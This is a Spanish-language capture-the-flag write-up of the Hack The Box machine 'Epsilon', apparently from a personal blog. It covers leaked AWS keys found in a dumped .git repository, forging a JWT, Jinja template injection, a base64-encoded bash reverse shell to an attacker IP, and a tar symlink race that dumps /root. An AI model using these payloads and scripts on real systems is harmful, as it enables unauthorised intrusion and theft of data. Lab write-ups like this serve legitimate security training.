---
layout: single
title: Epsilon - Hack The Box
excerpt: "Esta máquina ha sido algo complicada, sobre todo por el tema de enumeración y encontrar rutas ocultas y mucha explotación web"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-epsilon/epsilon1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Git
  - STTI  
---

# 10.10.11.134 - Epsilon

![](/assets/images/htb-epsilon/epsilon1.png)

----------------------

## Part 1: Enumeración del sistema

Los puertos abiertos son 22(ssh), 80(http), 5000(http):
- Nmap nos dice que por el puerto 80 ha encontrado una ruta .git
```console
└─$ whatweb http://10.10.11.134:5000
HTTPServer[Werkzeug/2.0.2 Python/3.8.10], PasswordField[password], Python[3.8.10], Script, Title[Costume Shop]
└─$ whatweb http://10.10.11.134     
Apache[2.4.41], HTTPServer[Ubuntu Linux]
```
---------------------------
## Part 2: Analizando el repo

Como tenemos un git vamos a analizarlo:
```console
└─$ git-dumper http://10.10.11.134/.git ./.git
└─$ git log --oneline         
c622771 (HEAD -> master) Fixed Typo  # Cambios en la tipografía, aparentemente nada interesante
b10dd06 Adding Costume Site   
c514416 Updatig Tracking API
7cf92a7 Adding Tracking API Module

└─$ git diff c622771 b10dd06 
# Habla de una llave secreta aws (acces_key y secret_acces_key) Tambien nos dan el dominio:
# http://cloud.epsilon.htb (cambiado a http://cloud.epsilong.htb)

└─$ git diff c622771 7cf92a7
# Código fuente eliminado en server.py, se han eliminado.
# Web en flask:
# Función para verificar el jwt (ver si existe el parámetro 'username')
# Endpoint POST en la raiz (/) con las credenciales "username=admin" y "password=admin"
# Si pones esas creds se te crea una cookie "username":"admin" con el algoritmo HS256
# De tener la cookie secreta, puedes acceder a la ruta /home.html, /track.html
# Ruta /order.html pide la llave secreta y pide el parametro "costume" (se supone que es una tienda de disfraces)

└─$ git diff c622771 7cf92a7
# Encontramos las llaves que mencionaban antes
# aws_access_key_id='AQLA5M37BDN6FJP76TDC',
# aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
# region_name='us-east-1'
```
Si decodificamos las llaves en base64 no salen mas que bytes raros, asi que habŕa que ponerlas tal y como están.

```console
└─$ whatweb http://cloud.epsilon.htb
[302 Found] Apache[2.4.41], -> RedirectLocation[http://cloud.epsilon.htb/403.html]
http://cloud.epsilon.htb/403.html -> [302 Found]
```
Hacemos una prueba con lo de antes 
```console 
└─$ curl -s -X POST http://cloud.epsilon.htb -d 'username=admin&password=admin'
# Nos lleva a error 403.html 
```
---------------------------------
## Parte 3: La web y AWS

La web **cloud.epsilon.htb** devuelve un 302 Error. La web del puerto 5000 tiene un panel de registro.  

![](/assets/images/htb-epsilon/epsilon2.PNG)

Ponemos admin:admin y no da resultado. Aun así parece ser la web del repo. 
La ruta **/home** nos devuelve al panel, la **/track** no.  

![](/assets/images/htb-epsilon/epsilon3.PNG)

Mirando el codigo fuente no hay nada mas interesante:

Pero si le metermos un ID como pide nos lleva otra vez al panel del registro.
Las inyecciones SQL no funcionan ```admin' and 1=1-- -``` o ```admin' and sleep(5)-- -``` 

```python3
secret = '<secret_key>'  #  O sea puede ser alguna de las que tenemos
if verify_jwt(request.cookies.get('auth'),secret):
```
```console
└─$ curl -s http://10.10.11.134:5000/home --cookie "Auth: AQLA5M37BDN6FJP76TDC" -L | html2text
# Tampoco
```

Hay otro script en python en nuestro git **track_api_CR_148.py**, este no ha sufrido cambios ya que en el git diff
no ha salido nada de él (salvo que censuren la cookie).
Este funciona sobre **cloud.epsilon.htb**, y funciona con AWS lambda

AWS Lambda es un servicio que permite correr una aplicación (ej la tienda de antes de Flask) para no tener que 
depender de montar un servidor.

Para todo lo que tenga que ver con AWS se puede usar este comando **aws**. He tenido un problema con aws y python
por el tema de parentesis, lo solucione con ```sudo pip uninstall aws -> sudo pip install --upgrade awscli```
```console
└─$ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: json

└─$ aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb 
# "FunctionName": "costume_shop_v1"
└─$ aws lambda --endpoint-url=http://cloud.epsilon.htb get-function --function-name=costume_shop_v1
# Devuelve lo mismo basicamente, pero tambien la ruta
# http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
# "PackageType": "Zip"
└─$ curl -s http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code -O
└─$ mv code code.zip; unzip code
└─$ cat lambda_function.py
# Otro secreto -> secret='RrXCv`mrNe!K!4+5`wYq'
```
Este secreto sirve para el server.py

```console
└─$ python3
>>> import jwt
>>> secret = 'RrXCv`mrNe!K!4+5`wYq'
>>> jwt.encode({'username':'admin'}, secret, algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
```
![](/assets/images/htb-epsilon/epsilon4.PNG)
![](/assets/images/htb-epsilon/epsilon5.PNG)

Ahora podemos entrar en la ruta /order con POST -> costume=glasses&q=test&addr=test  

![](/assets/images/htb-epsilon/epsilon6.PNG)

---------------------------------
## Parte 4: Accediendo al sistema

Para maniobrar mas cómodamente me hago un script: 

```python
import requests

sess = requests.session()
main_url = "http://epsilon.htb:5000/order"
cookies = {'auth':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'}

data = {'costume':'glasses','q':'test','addr':'test'}
req = sess.post(main_url, cookies=cookies, data=data)
print(req.text)
```
```console
*** Select your costume and place an order ***
We've limited stock right now!

                  [One of: Retro Sun Glasses/Time Traveller Goggles Top Hat/
Select a Costume: Kinetic Kitten Mask/Phantom Mask/Phantom Mask/Phantom Mask/
                  Phantom Mask]
Enter Quantity:   [q                   ]
Enter Address:
[Order]
Your order of "glasses" has been placed successfully.
```

Como es python y refleja el resultado, podriamos probar un STTI: ```data = {'costume':'{{7*7}}','q':'1','addr':'{{7*7}}'}```  
Si pongo ```{{url_for.__globals__.os.popen('whoami').read()}}``` el resultado es: ```Your order of "tom " has been placed successfully.```  

```console
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64 -w0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK
```
```python
comando = "echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK | base64 -d | bash"
stti = "{{url_for.__globals__.os.popen('" + comando + "').read()}}"
data = {'costume': stti,'q':'1','addr':'{{7*7}}'}
```

Y tenemos acceso al sistema, encima scripteado por lo que es muy comodo. Encima subo mi script de enumeración:  
- MI usuario "Tom", el otro root, nadie mas  
- No hay capabilities pero si un sudo SUID (luego vemos si es una versión vulnerable)  
- Este tal Tom es el propietario de todo el codigo fuente de la app. Ruta **/var/www/app/**  
- Hay un backup que parece interesante en -> /var/backups/web_backups  
- Parece que hay un conteneder en la ip 172.19.0.2 conectado por el puerto 4566 (esta máquina es 172.19.0.2)  

```console
tom@epsilon:/tmp$ ping -c 1 172.19.0.2
1 packets transmitted, 1 received, 0% packet loss, time 0ms # En efecto
```
El conteneder es lo que debe correr la app supongo. Subo un detector de [procesos](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh)  

```console
tom@epsilon:/tmp$ ./procmon.sh
> /bin/sh -c /usr/bin/backup.sh
> /bin/bash /usr/bin/backup.sh
```
---------------------------------
## Parte 5: Escalando privilegios gracias a enlaces simbólicos

Encontramos este script:
```bash
#!/bin/bash
file='date +%N' # Fecha actual en nanosegundos
/usr/bin/rm -rf /opt/backups/*  # Elimina todo lo que haya en /opt/backups/
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/ # Comprime lo de /var/www/app/ y lo mete en /opt/backups/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum # Hace un hash del archivo y lo mete en /opt/backups/checksum 

sleep 5 # Espera cinco segundos
check_file='date +%N' # Otra vez calcula el tiempo en nanosegundos
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar" 
# Comprime /opt/backups/checksum y /opt/backups/$file.tar y lo mete en /var/backups/web_backups/${check_file}.tar
/usr/bin/rm -rf /opt/backups/* # Luego vuelve a vaciar el directorio /opt/backups
```

O sea estamos tratando con un script que cada cinco segundos nos vacia el /opt/backups. En cambio los archivos de /var/backups/web_backups se mantienen mas tiempo.   
Si hacemos ```watch -n 1 ls /opt/backups/``` Encontramos en un breve tiempo **678160166.tar** y **checksum**  

Las opciones de tar son **-c** y **-f** que son para crear un archivo:  
 > ```tar tar -cvf etc.tar /etc``` Comprime lo que haya en /etc dentro de etc.tar    
El probelma es la segunda vez que usa este comando con la opción **-h** que tiene que ver con enlaces duros.    
En /var/www/app/ hay las rutas /img/ con fotos, /app.py que es el codigo que ya teniamos y los htmls de las otras rutas.  
Si se sustituye el cheksum por un enlace a /root/ (```ln -s /root checksum```) y luego copiamos el tar que cree a /tmp nos habrá volcado los contenidos de root.  

Como hay que ser rapidos con el tiempo mejor que se escriptee esto:  
```bash
#!/bin/bash
while true; do
        if [ -e /opt/backups/checksum ]; then
                echo "[*] Existe el archivo"; rm -rf /opt/backups/checksum   # Elimina el cheksum original
                echo "[*] Creando el enlace a /root"; ln -s /root /opt/backups/checksum; sleep 5  # Crea uno nuevo que apunte a la carpeta del root
                break
        fi
        cp /var/backups/web_backups/*.tar /tmp/tars  # Copia ese nuevo tar (o tars) que se ha creado a /tmp/tars para que no se borren
done
```

```console
tom@epsilon:/tmp$ ./volcado.sh 
[*] Existe el archivo
[*] Creando el enlace a /root
tom@epsilon:/tmp$ ls -l ./tars
total 82376
-rw-r--r-- 1 tom tom  1003520 Nov 12 19:20 502699129.tar
-rw-r--r-- 1 tom tom  1003520 Nov 12 19:20 533085657.tar
-rw-r--r-- 1 tom tom  1003520 Nov 12 19:20 562277370.tar
-rw-r--r-- 1 tom tom  1003520 Nov 12 19:20 588944643.tar
-rw-r--r-- 1 tom tom 80332800 Nov 12 19:20 619307816.tar # Este sin duda, es el mas grande
tom@epsilon:/tmp/tars$ tar xvf 619307816.tar
tom@epsilon:/tmp/tars$ cd ./opt/backups/checksum/
tom@epsilon:/tmp/tars/opt/backups/checksum$ ls
docker-compose.yml  lambda.sh  root.txt  src
```